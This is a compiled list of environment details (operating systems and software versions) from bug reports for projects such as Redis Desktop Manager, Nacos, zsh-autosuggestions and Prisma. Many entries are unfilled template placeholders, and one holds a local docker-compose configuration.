- os: [ centos 7] - memory,current disk space enough - tdengine version [1.6.1.7]
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- centos 7.0 - 8g, 2.0g x 2, 25g - tdengine version: 1.6.1.7 ebug version
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.3] - memory, cpu, current disk space - tdengine version [e.g
- os: centos 7 - memory: 8g, cpu 2g x2, current disk space: > 4g - tdengine version e.g
ubuntu 18.04] - tdengine version [e.g
- os & version:mac 10.15.7
- os & version: [deepin v20]( deepin is base on debian 10.5: ```bash $ cat /etc/debian_version 10.5 $ uname -a linux home 5.4.50-amd64-desktop #74 smp mon aug 24 20:15:37 cst 2020 x86_64 gnu/linux ``` - redis-server version: 2020.4+6a635b62
- redis latest/stable via snap (`6.0.8`)
- rdm latest/stable via snap (`2020.4+6a635b62`) - os & version: ubuntu 20 great project by the way! really decreases cost of entry!
- os & version: win7 x64 - redis-server version: 5.0.9 - rdm version: redis-desktop-manager-2020.4.237.exe from the official subscription
- all tested redis versions (4.14, 4.11, 5.* 6.*)
- os & version: mac 10.15.6 - redis-server version 5.0.5
- os & version: microsoft windows [version 10.0.17763.1397] - redis-server version don't know, but right from the microsoft store.
windows 10 1909 x64
- os & version: macos 10.15.3 - redis-server version 6.0.5
- os & version: windows server 2019 - redis-server version 4.x
- os & version: windows 10, 1909 - redis-server version: 2.8.4 - rdm version: 2020.2.225
- os & version: windows 10 2004 - redis-server version: tried 5 and 4 with the same result
- os & version: mac os catalina 10.15.5 (19f101) - redis-server version: 6.0.5
- os & version: ubuntu 18.04 - redis-server version: ```
redis-server --version
redis server v=6.0.5 sha=00000000:0 malloc=jemalloc-5.1.0 bits=64 build=f82f8c0da96442be
- os & version: ubuntu 18.04.4 lts - redis-server version: 5.0.3
- os & version: macos 10.15.5 - redis-server version 2020.0.80 (app store)
- windows 10 version 1903
- ubuntu 18.04 - redis-cli 4.0.9
- os & version: ubuntu 18.0.4 - redis-server version 2020.0+36f6f5ao
- os & version: linux mint 19.3 cinnamon edition - redis-server version [e.g
- os & version: macos 10.15.4 - 5.0.5
on ubuntu 19.04 with python3 by default
- ubuntu 18.04 as well as arch linux - using xfce + i3wm
- os & version: macos 10.15.4 - redis-server version 4.0.9
- os & version: linux ubuntu 18.04 - redis-server version 5.0.3 - source of package: snap store - redis desktop manager version: 2019.5-c57dd5f
- os & version: mac 10.15.4 - redis-server version :5.0.1 - app version: 2020.0.79
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [ windows 10 pro] - redis desktop manager version : [redis-desktop-manager-2020.0.193]
- os & version: windows 10 1909 - redis-server version: 5.0.9
- qt creator: 4.12.0
- os & version: win10 1909 - redis-server version : 2020.0 ![qq 0200430170058](
- os & version: windows 10 1909 - redis-server version: 5.0.0, docker, alpine
- os & version: windows 10 pro - redis-server version 4.0.9
- os & version: opensuse tumbleweed and opensuse leap 15.1
[buildlog.txt](
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
desktop build : 2019.5.0
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os ubuntu 18.04, tool version 2019.5 - redis-server version 5.0.5 , 4.0.10
- os & version: ubuntu 19.04 - redis-server version: 5.0.3 - rdm version: 2019.4-83abef8 let me know a way to help gather more info from the crash.
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: microsoft windows 10 enterprise 10.0.17134 build 17134 - redis-server version 4.0.9
- os & version: linux ubuntu 18.04
- os & version: macos app store builds - redis-server version any
> snap info redis-desktop-manager
installed: 2019.3-83abef8
- os & version: windows 10 1903 - redis-server version: mixed
ubuntu 18.04
2019.03 version
- os & version: microsoft windows [version 10.0.15063]
windows 10 insider preview 18947.1000 (rs_prerelease) (2)
redis desktop manager 2019.3.150
redis server 3.2.100
- os & version: mac os 10.15 - redis-server version: 2019.2.140
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- macos 10.14.5 reverting back to 2019.1 works normally + nothing about this extremely signifcant change on the changelog..
- os & version: macos 10.14.5 (18f132) - rdm: 2019.2
- macos latest (at this time)
- python installed, reported version `brew info python` = `python: stable 3.7.4`
- qt creator 4.9.2 with desktop qt 5.9.8 clang 64 bits (5.9 as requested in the instructions)
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- windows 7 sp1
- os & version: windows 10 pro version 1803 - redis-server version: redis on windows 3.2.100
- os & version: windows 10 1809 - redis-server version: current redislap
- redis desktop manager: 2019.1.1346
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: microsoft windows [version 10.0.17763.475] - redis desktop manager version: redis-desktop-manager-2019.1.1346
- os & version: windows 10 1806 - redis-server version 9.3.817
- arch linux - redis-server 4.0.9
- windows 10 17763 - 4.0.2.3
- os & version: linux mint 18.3 kde - redis-server version 3.0.6
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [windows 10 ] - redis-server version [0.9.8]
- os & version: windows 10 1809 - redis-server version 3.2.100
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- os & version: [e.g
windows 10 1806] - redis-server version [e.g
- node version: `10.13.0`
- yarn v1 version: `1.12.1`
- node version: `12.14.1`
- yarn v1 version: `1.21.1` - os and version: macos 10.15.2 (19c57)
- node v9.6.1
- yarn v1.5.1
- macos 10.13.3
- os: mac os - version nacos-server 1.3.x and 1.4.x - module naming
- os: windows - version nacos-server 1.4.0, nacos-client 1.4.0 - module distribution/bin - sdk spring-cloud-alibaba-nacos
- os: any - version nacos-server 1.3.2 - module [e.g
naming/config]
- os: [windows 10 client,linux server] - version [nacos-server 1.3.1, nacos-client 1.3.1] - module [naming]
- os: any os - version: nacos-client 1.3.1, 1.3.2 - module: config - sdk: original
centos] - version [e.g
nacos-server 1.3.2, nacos-client 1.3.2] - module [e.g
naming/config] - sdk [e.g
original, spring-cloud-alibaba-nacos, dubbo]
centos] - version [e.g
nacos-server 1.3.1, nacos-client 1.3.1] - module [e.g
naming/config] - sdk [e.g
original, spring-cloud-alibaba-nacos, dubbo]
- os: [mac os] - version [nacos-server 1.3.1+] - module [naming]
- os: macos - version: nacos-server 1.3.2 - browser: firefox
- os: windows - version nacos-server 1.3.2 - module client
- os: ubuntu 20.04.1 lts - version nacos-server 1.3.2 - module console
centos] - version [e.g
nacos-server 1.3.1, nacos-client 1.3.1] - module [e.g
naming/config] - sdk [e.g
original, spring-cloud-alibaba-nacos, dubbo]
- os: macos - version [nacos-server 1.4.0-snapshot, nacos-client chrome-console]
- os: centos - version nacos-server 1.4.0-snapshot - module console
centos] - version [e.g
nacos-server 1.3.1, nacos-client 1.3.1] - module [e.g
naming/config] - sdk [e.g
original, spring-cloud-alibaba-nacos, dubbo]
centos] - version [e.g
nacos-server 1.3.1, nacos-client 1.3.1] - module [e.g
naming/config] - sdk [e.g
original, spring-cloud-alibaba-nacos, dubbo]
- os: windows 10 - browser chrome - version 79.0.3945.117
- os: windows 7 64bit - browser chrome - version chrome 76.0.3809.132 thx
- os: win10 - browser chrome, firefox dev edition - version chrome: 75 , firefox:69
- os: debian linux 10 - browser chrome - version 86.0.4240.111 (build oficial) (64 bits) also tested on firefox and windows.
ios] osx 10.15.6
- os: ios - browser: chrome - version: 83
- ff 77 macos 10.5
- ios - browser (chrome)
- os: linux - browser firefox - version 74
- os: macos 10.15.2 - browser firefox - version 72.0.2
- os: macos and windows 10 - browsers: chrome 79 and firefox 72
- os: windows 10
- browser: chrome - version : 86.0.4240.111
- os: windows 10 home insider preview build 20190
- browser: chrome version 84.0.4147.125 (official build) (64-bit)
- version: js-cookie 2.2.1
windows 10 home 64 bit chrome version 84.0.4147.125 (official build) (64-bit) cdn: ```<script src=" "></script>``` i\'ve checked the [faq]( and didn\'t see anything on this.
- browser [e.g
chrome, safari]
- version [e.g
- browser [e.g
chrome, safari]
- version [e.g
- browser [e.g
chrome, safari]
- version [e.g
- os: macos catalina (10.15.5)
- browser: tested on firefox and chrome
- version: ff v77.0.1 and chrome v83.0.4103.97
ios] mac catalina v10.15.5
- browser [e.g
chrome, safari] firefox developer edition - version [e.g
- os: macos 10.15.3
- browser safari
- version 13.0.5 (15608.5.11)
- browser [e.g
chrome, safari]
- version [e.g
- os: ubuntu 19.10
- browser: chromium
- version: 78.0.3904.108 snap 64-bit
- os: windows - browser: microsoft edge - version: 85.0.564.44 (official build) (64-bit)
- os: macos catalina - browser: google chrome 78 - version: animejs@3.1.0
- browser all
- version 9.5.0
- os: windows 10
- browser: ie-11
- version: 11.737.17763.0
- os: macos (although this has been reported on other systems as well)
- browser: chrome
- version: 77
- os: mac os 10.14.3 - browser: chrome 72.0.3626.121 (official build) (64-bit) - version: 7.3.1
- macos mojave 10.14 - chrome v70.0.3538.77, safari v12.0 (14606.1.36.1.9), firefox v63.0.1 (64-bit)
- os: os x - browser chrome/firefox - version: latest
- os: both mac and windows - latest versions
- browser chrome (haven't tried others) - version 66
- os + distribution: macos 10.14.6 - zsh version: 5.3 - plugin version: tag: v0.6.4
manjaro linux
zsh 5.8 (x86_64-pc-linux-gnu)
installed via pacman
- os + distribution: arch linux (plasma 5.20.1) - zsh version: 5.8 - kernel: linux 5.4.72-1-lts
- os + distribution: ubuntu 20.04.1 lts - zsh version: 5.8 - plugin version: ae315ded4 (i.e
current `master`)
- os + windows 7 x64 sp1 , cygwin x86_64 3.1.7-1 - zsh version: 5.8.1-1 - plugin version: 0.6.4
- os + distribution: os x mojave - zsh version: zsh 5.3 (x86_64-apple-darwin18.0) - plugin version: v0.6.4
- os + distribution: ubuntu 20.04 - zsh version: 5.8 - plugin version: commit ae315ded4dba10685dbbafbfa2ff3c1aefeb490d (head -> master, tag: v0.6.4)
- os + distribution: ubuntu 20.04 - zsh version: 5.8 - plugin version: git commit: ae315de
- os + distribution: mac os x 10.15.5 (build 19f101) - zsh version: 5.7.1 - plugin version: ae315ded4dba10685dbbafbfa2ff3c1aefeb490d
- os + distribution: wsl2 ubuntu 18.04 - zsh version: 5.4.2 - plugin version: i don't know how to dig the problem .
zsh 5.7.1 (x86_64-apple-darwin19.0)
- os + distribution: macos 10.15.5 (19f101) - zsh version: 5.7.1 - plugin version: ae315ded4dba10685dbbafbfa2ff3c1aefeb490d
- os + distribution: macos 10.15.2 (19c57) && darwin 19.2.0 - zsh version: 5.7.1 - plugin version: ae315ded4dba10685dbbafbfa2ff3c1aefeb490d
- os + distribution: macos 10.15.4 (19e287) - zsh version: 5.8 - plugin version: ae315ded4dba10685dbbafbfa2ff3c1aefeb490d
- os + distribution: `centos linux release 7.5.1804 (core)` + `linux version 3.10.0-862.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.5 20150623 (red hat 4.8.5-28) (gcc) ) #1 smp fri apr 20 16:44:24 utc 2018` - zsh version: `5.0.2` - plugin version: ```
commit ae315ded4dba10685dbbafbfa2ff3c1aefeb490d
merge: d43c309 ff298e5
author: eric freese <ericdfreese@gmail.com>
date: mon jan 6 21:12:21 2020 -0700 merge pull request #494 from zsh-users/develop v0.6.4
- os + distribution: arch linux 2020.03.01 - zsh version: 5.8 - plugin version: 0.6.4
- os + distribution: 5.5.9-arch1-2 x86_64 gnu/linux - zsh version: zsh 5.8 (x86_64-pc-linux-gnu) - plugin version: commit ae315ded4dba10685dbbafbfa2ff3c1aefeb490d
- os + distribution: macos 10.15.4 - zsh version: 5.8 - plugin version: 0.6.4, ae315de
![image]( - os: arch linux 2020.04.18 - zsh version: 5.8 - plugin version: latest
- os + distribution: macos catalina 10.15.4 (19e287) - zsh version: 5.7.1 - plugin version: 0.6.4(ae315ded4dba10685dbbafbfa2ff3c1aefeb490d)
- os + distribution: arch linux 5.5.11 - zsh version: 5.8 - plugin version: 0.6.4-1
- os + distribution: osx - zsh version: 5.7.1 - plugin version: ```
$ cat ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/version
- os + distribution: macos 10.14.6 - zsh version: 5.8 - plugin version: v0.6.4 (ae315de)
- os + distribution: macos catalina (10.15.3) - zsh version: 5.7.1 - plugin version: 0.6.4
- os + distribution: ubuntu 18.04.2 lts under wsl - zsh version: 5.4.2 - plugin version: dunno
how do i get this? installed w/ `zplugin light zsh-users/zsh-autosuggestions`
- os + distribution: windows 7 + cygwin 3.1.2 (tried both 32bit and 64bit) - zsh version: 5.5.1 - plugin version: 0.63
- os + distribution: <!-- e.g
arch linux 2019.07.01 -->
linux archlinux 4.19.91-1-lts x86_64 gnu/linux - zsh version:
5.7.1 - plugin version:
autosuggestions 0.6.3
syntax highlighting 0.6.0 and the feature/redrawhook branch
- os + distribution: raspbian gnu/linux 8 (jessie) - zsh version: 5.0.7 - plugin version: d43c309
- os + distribution: macos 10.15.1 - zsh version: 5.7.1 - plugin version: d43c309f888153d6c46d8b6a3a0186f4148680fd
- os + distribution: macos catalina 10.15.1 - zsh version: 5.7.1 - plugin version: current master (d43c309f) and develop (bdbe43e6)
- os + distribution: ubuntu 18.04 - zsh version: 5.4.2 - plugin version: 0.5.0+1.1
- version="19.04 (disco dingo)" regolith-linux-desktop - zsh 5.5.1 (x86_64-ubuntu-linux-gnu) - commit 43f3bc4010b2c697d2252fdd8b36a577ea125881
- server: ubuntu 18.04 lts - termianl to connect to the server: mobaxterm on windows 10 - zsh version: 5.4.2 - plugin version: 43f3bc4010b2c697d2252fdd8b36a577ea125881 (jul 15, 2019) - the most current as of the date of this report.
- device: pixel 3a - os: android 10 - browser: chrome for android - version: 79.0.3945.116 thank you very much!
- device: iphone8 - os: ios12.3.1 - browser safari - version safari 12.1.1
- device: [e.g
- browser [e.g
stock browser, safari]
- version [e.g
- device: [e.g
- browser [e.g
stock browser, safari]
- version [e.g
- device: [e.g
- browser [e.g
stock browser, safari]
- version [e.g
- device: [e.g
- browser [e.g
stock browser, safari]
- version [e.g
- device: [e.g
- browser [e.g
stock browser, safari]
- version [e.g
- connector: both `postgres` and `mysql` - prisma server: [e.g
`1.34.7`] - `prisma` cli: ` prisma/1.34.7 (windows-x64) node-v10.15.3` - os: `windows 10`
- prisma-client-lib 1.34.4
- connector: `postgres`, - prisma server: `1.34.5` - `prisma` cli: prisma/1.34.5 (windows-x64) node-v8.9.4, - os: `windows 10`,
- connector:postgres - prisma server: `1.34.5` - prisma: `prisma/1.34.5 (windows-x64) node-v10.16.2` - os: `windows 10`
- connector: `postgres` with `golang` - prisma server: `1.31.0` - `prisma` cli: `prisma/1.32.0 (darwin-x64) node-v11.2.0` - os: `macos mojave` - other dependencies: `gqlgen` to generate prisma
- prisma cli version: prisma/1.34.3 (darwin-x64) node-v8.11.3 - prisma server version: 1.32.0-beta - npm: 6.5.0
- connector: `mongodb` - prisma server: `1.24.0` - `prisma` cli: prisma/1.34.3 (linux-x64) node-v10.15.0 - os: `ubuntu 18.04`
- connector: `postgres` - prisma server: docker:`prismagraphql/prisma:1.34` - `prisma` cli: ` prisma/1.34.3 (windows-x64) node-v10.15.3` - os: `windows 10` - other dependencies: `prisma-client-lib`, `prisma-binding`
- connector:`mysql` - prisma server: 1.34.3 #multiple versions - `prisma` cli: prisma cli version: prisma/1.34.0 (darwin-x64) node-v10.4.1 - os: `os x mojave`
- connector: `postgres` - prisma server: 1.34.1 - `prisma` cli: `prisma/1.34.1 (darwin-x64) node-v11.7.0`] - os: `macos 10.14.5`
- connector: `postgres` - prisma server: `1.34` - `prisma` cli: `prisma/1.34.1 (windows-x64) node-v10.16.0` - os: `windows 10`
- connector: `mongodb` - prisma server: `1.35-beta` - os: `windows 10 x64` - other dependencies: `"nexus": "^0.12.0-beta.6", "nexus-prisma": "^0.3.7", "prisma-client-lib": "^1.34.0"`
- connector: `mysql` - prisma server: `1.29.2` - `prisma` cli: `1.29.2`
- connector: postgres - `prisma` cli: 1.28.1 - os: os x mojave
- prisma-binding: "2.1.6"
- connector: mysql - prisma server: 1.32.0-beta
- connector: postgres - prisma server: 1.34.0 - `prisma` cli: prisma cli version: prisma/1.34.0 (darwin-x64) node-v10.16.0 - os: macos 10.14.5 mojave
- connector: postgres - prisma server: 1.34.0 - `prisma` cli: prisma/1.34.0 (windows-x64) node-v10.16.0 - os: `windows 10 pro` - other dependencies: `prisma-binding v2.3.15`
- connector: `mysql` - prisma server: latest, `1.34.0` - `prisma` cli: golang - os: `ubuntu 18.04`
- connector: `postgres` - prisma server: `1.34.0` - `prisma` cli: `prisma/1.34.0 (linux-x64) node-v10.16.0` - os: `ubuntu 16.04` i'm stuck at this database migration for more than a week
any help on this is highly appreciated.
- connector: mysql (mariadb) - prisma server: 1.34 - `prisma` cli: prisma and prisma-client-lib 1.34 on node - os: windows 10
- connector: mysql - prisma server: 1.28.6 - `prisma` cli: 1.28.6 - os: windows 10 - other dependencies: `prisma-client`, `prisma-binding`, etc
if applicable
- connector: mysql - prisma server: 1.34 - `prisma` cli: prisma/1.34.0 (linux-x64) node-v9.4.0 - os: arch
- connector: mysql` - prisma server: - `prisma` cli: v1.28.3 - os: windows 10 - other dependencies: `prisma-client`, `prisma-binding`, etc
if applicable
- connector: `postgres`, `mysql` tried both - prisma server: `1.34`, `1.35-btea` - `prisma` cli: [e.g
`prisma/1.34.0 (darwin-x64) node-v10.4.0`] - os: `os x high sierra` **upd**: now i\'m really really confused it works for some names like "children, childre" but not for others, i don\'t have anything else in my schema.
- connector: `postgres` - prisma server: `1.34.0` - `prisma` cli: `prisma/1.34.0 node:10.15-alpine` - os: `ubuntu 18.04` - other dependencies: `prisma-client`
- connector: postgres & mysql - prisma server: 1.33 - `prisma` cli: n/a - os: n/a (tried both windows 10 & one hosted on heroku through prisma cloud)
- connector: `mysql` - prisma server: `1.33.0` - `prisma` cli: `prisma/1.33.0 (darwin-x64) node-v11.14.0` - os: `os x mojave` - table type: innodb - table encoding: cp1252 west european (latin1) - table collation: latin1_swedish_ci
- connector: postgres:latest as of 5/21/2019 - prisma server: v1.33.0 - `prisma` cli: prisma/1.33.0 (windows-x64) node-v11.4.0 - os: windows 10 **additional**
i've confirmed 1:1 and 1:n relationships do work still, just not n:m.
- connector: `mysql` - prisma server: `1.33` - `prisma` cli: [e.g
`prisma/1.33.0 node: v10.13.0`] - os: `macos mojave` - other dependencies: `prisma-client`, `prisma-binding`, etc
if applicable
- connector: `mysql`] - prisma server: [`1.26.6`, `1.33.0`] - `prisma` cli: [`1.26.6`, `1.33.0`]
- connector: mysql - prisma server: 1.33 - `prisma` cli: 1.33 node-v11.11.0 - os: windows 10
- mysql server 5.7.26
- prisma 1.33 cli on node 12.2.0
- os: windows 10 pro x64
- connector: `mongodb` - prisma server: `1.32.0` - os: `installed in the aws fargate as described above` - other dependencies: `mongo-db version: 3.4.3`
- connector: postgres - prisma server: 1.32.2 - `prisma` cli: prisma/1.32.2 (darwin-x64) node-v12.2.0 - os: macos 10.14.3 mojave
- connector:mongodb - prisma server: ? don't know how to get that - `prisma` cli: prisma/1.32.2 - os: mac os
- connector: postgres - prisma server: 1.32.2 - `prisma` cli: prisma/1.32.2 (linux-x64) node-v12.2.0 - os: ubuntu 18.04 lts
- connector: `mysql` - prisma server: `1.32.0` - `prisma` cli: `prisma/1.32.2 (darwin-x64) node-v11.2.0` - os: `macos mojave`
- connector: `postgres` - prisma server: `1.29.0` - `prisma` cli: [e.g
`prisma/1.32.0 (darwin-x64) node-v8.11.1`] - os: `os x sierra`
- connector:`mysql` - prisma server: `1.23.4` - `prisma` cli: `1.23.4` - os: `ubuntu 16.04`
- connector: `postgres` & `mysql` - prisma server: 1.32.2
- connector: `mysql`
- prisma server: `1.32.2`
- `prisma` cli: `prisma/1.32.2`
- node: `v10.15.3`
- os: `windows 10 pro`
- connector: `mysql:5.7` - prisma server: `1.31.0` - os: os x 10.14.4 - other dependencies: `prisma-client`
- connector: mysql - prisma server: 1.28.0 - os: macos mojave
- connector: `mongodb` - prisma server: `1.32` - os: `os mojave` - other dependencies: `prisma-client`
- connector: postgres - prisma server: 1.32.0 - `prisma` cli: prisma/1.32.0 (darwin-x64) node-v10.15.1 - os: macos 10.14.3 mojave cc @kshenes
- connector: `mysql` - prisma server: `1.26.4` & tested `1.30.0` locally
- connector: postgres - `prisma` cli: prisma/1.31.0-alpha.1 (darwin-x64) node-v10.12.0
- connector: postgres - prisma server: 1.31 - `prisma` cli: prisma/1.31.1 (darwin-x64) node-v10.15.2 - os: os x high sierra - other dependencies: go-prisma-client
- connector: `mongodb` - prisma server: `1.31.0` - `prisma` cli: prisma/1.31.1 (darwin-x64) node-v8.14.1 - os: macos
- connector: postgres - prisma server: 1.24.0 (will update soon - `prisma` cli: 1.31.0 - os: antergos
- connector: [`mongodb`] - prisma server: [`1.31`] - `prisma` cli: [`prisma/1.31.0, node-v10.15.3`] - os: [`windows 10`] - other dependencies: none.
- connector: prisma demo cloud + mysql - prisma server: [e.g
`1.32.0-beta`] - `prisma` cli: `prisma/1.32.0-beta (windows-x64) node-v8.11.3` - os: `windows 10`
- connector: mongodb - prisma server: 1.28 - `prisma` cli: prisma/1.26.3 (darwin-x64) node-v8.15.0 - os: osx mojave
- connector: demo-servers - prisma server: `1.32-beta` - `prisma` cli: `prisma/1.26.6 (darwin-x64) node-v10.13.0` - os: `os x mojave` - other dependencies: `prisma-binding`
- connector: `postgres` - prisma server: `1.30.1` - `prisma` cli: `prisma/1.30.1 (linux-x64) node-v8.15.1`] - os: `ubuntu 18.04` - other dependencies: `prisma-binding`
- connector: `postgres` - prisma server: 1.31-beta5 - other dependencies: `prisma-client` 1.31-beta5
- connector: mysql
prisma cli version: prisma/1.32.0-alpha.3 (linux-x64) node-v10.15.2
also tried with last stable prisma first then upgraded to alpha
server is on centos 7 , remote server hosting mysql db is centos 6
- connector: postgres - prisma server: 1.31-beta5 - other dependencies: prisma-client 1.31-beta5
- connector: `mongodb` - prisma server: `1.30` - `prisma` cli: `1.30` **additional context:**
omitting the `database` field also works if the database name is present in connection string, which relates this issue to
- connector: `mongodb` - prisma server: `1.30` - `prisma` cli: `1.30`
- connector: mysql - prisma server: 1.29.2 - `prisma` cli: 1.29.2 - os: running in ci in the official node 8.11.2 docker image - other dependencies: n/a
- connector: mongodb - `prisma` cli: 1.30.0 (darwin-x64) node-v11.9.0 - os: os x high sierra - other dependencies: `prisma-binding`, `graphql-yoga`
- connector: `postgres` - prisma server: `1.29` - `prisma` cli: `prisma/1.30.0 (windows-x64) node-v10.15.0` - os: `windows 10`
- connector: `mysql` - prisma server: `1.30` - `prisma` cli: `1.30`
- connector: `mongodb` - prisma server: 1.30 - `prisma` cli: prisma/1.30.0 (darwin-x64) node-v11.13.0 - os: macos mojave **workaround**
i managed to fix this by removing the `schema` field in the default database config in the docker-compose service environment variable.
``` databases: default: connector: mongo schema: default_default uri: >- mongodb+srv://host/db?fake=true
``` databases: default: connector: mongo uri: >- mongodb+srv://host/db?fake=true ```
- connector: demo database - `prisma` cli: `1.29.1` - os: `os x high sierra`
- connector: `postgres` - prisma server: `1.25.0` - `prisma` cli: `prisma/1.27.0 (windows-x64) node-v11.9.0` - os: `windows 10` - other dependencies: `prisma-client`
- connector: `postgres` - prisma server: 1.27 - `prisma` cli: n/a - os: n/a
- connector: `postgres` - prisma server: `1.29` - `prisma` cli: `prisma/1.29.2 (darwin-x64) node-v11.10.1` - os: `os x high sierra`
- connector: mongodb(4.0.6) - prisma server: 1.29.2 - `prisma` cli: 1.29.2 - os: macos 10.14.3
- connector: `mysql` - prisma server: `prismagraphql/prisma:1.31-alpha` - `prisma` cli: `prisma:1.31-alpha`, `node: v10.13.0` - os: `macos mojave`
- connector: `postgres` - `prisma` cli: `1.31.0-alpha.3`
- connector: [`postgres`] - prisma server: [`1.29.2`] - `prisma` cli: [`prisma/1.29.2 (windows10-x64) node-v11.1.0`] - os: [`windows 10`]
- connector: [`postgres`] - prisma server: [e.g
`prisma@beta`] - `prisma` cli: [`prisma/1.30.0-beta.3 (darwin-x64) node-v11.12.0`] - os: [`os x mojave`] - `prisma-client`, `prisma-binding`, `graphqlgen`
- connector: postgres - os: os x high sierra
- connector: mysql - prisma server: <1.29.1 - `prisma` cli: prisma/1.29.1 (linux-x64) node-v10.8.0 - os: debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 gnu/linux
os: centos-release-7-4.1708.el7.centos.x86_64
linux fdcd67765900 3.10.0-514.21.2.el7.x86_64 #1 smp tue jun 20 12:24:47 utc 2017 x86_64 x86_64 x86_64 gnu/linux
prisma: 1.15.3 and prisma-binding: 2.1.5: always fails
prisma: 1.27.3 and prisma-binding: 2.3.0: very often fails
prisma: 1.28.5 and prisma-binding: 2.3.9: very often fails
- prisma server: 1.28.5 - `prisma` cli: 1.28.5 - os: macos 10.14.3
- connector: postgres 10.2 - prisma server: n/a - `prisma` cli: prisma/1.28.5 (darwin-x64) node-v11.9.0 - os: macos mojave - other dependencies: n/a
- connector: postgres - postgres: 10.3 - prisma server: 1.28 - `prisma` cli: prisma/1.28.4 (linux-x64) node-v10.15.3 - os: ubuntu 18.04.2 **docker-compose.yml**
version: '3.5'
services: prisma: image: prismagraphql/prisma:1.28 container_name: dev_lpwanserver_prisma networks: - lpwanserver_net ports: - "4466:4466" depends_on: - postgres environment: prisma_config: | port: 4466 databases: default: connector: postgres host: postgres database: prisma schema: public user: prisma password: prisma rawaccess: true port: \'5432\' migrations: false postgres: image: postgres:10.3 container_name: dev_lpwanserver_postgres networks: - lpwanserver_net environment: postgres_user: prisma postgres_password: prisma volumes: - ./initdb:/docker-entrypoint-initdb.d - lpwanserver_postgres:/var/lib/postgresql/data
volumes: lpwanserver_postgres:
networks: lpwanserver_net: name: lpwanserver_net
- connector:`postgres` - prisma server: >=`1.28.3` - `prisma` cli: `prisma/1.29.0-beta.7 (windows-x64) node-v8.9.4` - os: `windows 10`
- connector: postgres - prisma server: 1.27 or 1.28 - os: ubuntu
- `prisma` cli: `prisma/1.28.0 (darwin-x64) node-v10.4.0` - `prisma-client-lib`: `1.28.0`
- `prisma` cli: `prisma/1.28.0 (darwin-x64) node-v10.4.0` - `prisma-client-lib` cli: `1.28.0`
- connector: `postgres` - prisma server: `1.28` - `prisma` cli: `prisma/1.28.3 (darwin-x64) node-v10.13.0` - os: `os x mojave`
- docker image: prismagraphql/prisma:1.28
- connector: `mysql` - prisma server: hosted version`1.26.4`
- connector: postgres - prisma server: 1.27.1 - `prisma` cli: prisma/1.27.1 (windows-x64) node-v8.9.4 - os: w10
- connector: postgres - prisma server: 1.27.1 - `prisma` cli: prisma/1.27.0 (darwin-x64) node-v11.10.0`] - os: macos mojave could be related to #4093 or #4086 thanks for the help!
- connector: postgres - prisma server: 1.27 - `prisma` cli: 1.27 - os: macos mojave (10.14.3) - other dependencies: `prisma-client`, docker
"prisma": "^1.28.0-beta",
"prisma-binding": "^2.3.3",
"prisma-client-lib": "^1.28.0-beta"
- connector: postgresql - prisma server: 1.27 - `prisma` cli: 1.27 & 1.28 - os: win10 and the hosted setup runs on digitalocean managed dbs
- other dependencies: not applicable
this only concerns the deploy method of the cli
- cli: 1.26.6
- connector: postgres - prisma server: 1.25 - `prisma` cli: `prisma/1.26.6 (darwin-x64) node-v8.12.0` - os: macos mojave 10.14.3 - other dependencies:
- postgresql: 10.5 - `prisma` cli: prisma/1.26.4 (darwin-x64) node-v11.9.0 - os: macos mojave
- connector: `postgres` - prisma server: `1.26.0` - `prisma` `prisma/1.26.4 (darwin-x64) node-v10.15.1` - os: `os x high sierra`
- connector: `postgres` - prisma server: `1.24.0` - `prisma` cli: `prisma/1.26.4 (darwin-x64) node-v11.9.0` - os: macos mojave
- connector: `postgres` - prisma server: `1.26.4` - `prisma` cli: `1.26.4` - os: `windows 10`
- connector: `postgres` - prisma server: `1.23.0` (hosted on heroku via prisma.io) - `prisma` cli: `prisma/1.26.4 (linux-x64) node-v10.15.0` - os: ubuntu 16.04 (windows subsystem for linux)
- connector: `postgres` - prisma server: 1.26.3 - `prisma` cli: prisma/1.26.3 (windows-x64) node-v8.9.4 - os: `windows 10`
- connector: mongodb - prisma server: 1.25.6 - `prisma` cli: prisma/1.25.6 (darwin-x64) node-v11.8.0 - os: macos 10.14.2 mojave
- connector: mongodb - prisma server: 1.25.4 - `prisma` cli: prisma/1.25.4 (darwin-x64) node-v10.5.0 - os: os x high sierra
- connector: mysql(demo server) - prisma server: demo server (ie latest beta 1.26-beta-1) - `prisma` cli: - os: macos mojave 10.14.2
- connector:`postgres` - prisma/1.25.3 (darwin-x64) node-v10.13.0 - os: `os x mojave`
- connector: demo server - prisma server: [e.g
`1.25.0`] - `prisma` cli: [e.g
`prisma/1.25.0 (darwin-x64) node-v10.4.0`] - os: windows 10
- connector: postgres - prisma server: not using - `prisma` cli: prisma/1.25.4 - os: 4.20.0-arch1-1-arch - other dependencies: graph-gohpers (
- connector: `mysql` - prisma server: `1.25.0` - `prisma` cli: `1.25.3` - os: `os x mojave`
- connector: mysql - prisma server: `1.25.0` - `prisma` cli: `1.25.3` - os: `os x mojave`
- connector: `mysql` - prisma server: `1.25.0` (fargate) - `prisma` cli: [e.g
`prisma/1.25.1 (darwin-x64) node-v10.4.0`] - os: `os x high sierra` - other dependencies: `prisma-client`, `prisma-binding` is this a known issue ? do i have to convert all uses of the prisma client to good old bindings (a lot of places in my code) ?
- connector: [`postgres`] - prisma server: [`1.25.0`] - `prisma` cli: [`prisma/1.25.0 (darwin-x64) node-v11.7.0`] - os: [`os x high sierra`, `ubuntu 18.04`] - other dependencies: `prisma-client`, `prisma-binding`
